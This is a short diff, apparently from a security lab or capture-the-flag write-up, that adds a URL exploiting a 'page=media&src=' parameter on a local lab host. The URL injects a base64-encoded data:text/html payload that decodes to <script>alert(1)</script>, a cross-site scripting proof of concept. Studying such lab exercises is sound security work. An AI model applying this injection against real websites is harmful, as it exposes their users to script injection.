@@ -7,3 +7,5 @@ ANd the data of the Object tag chosen by the src variable in the url : http://{I
 <object data="http://{IP}/images/nsa_prism.jpg"></object>
 
 PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== -> <script>alert(1)</script>
+
+http://192.168.56.102/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
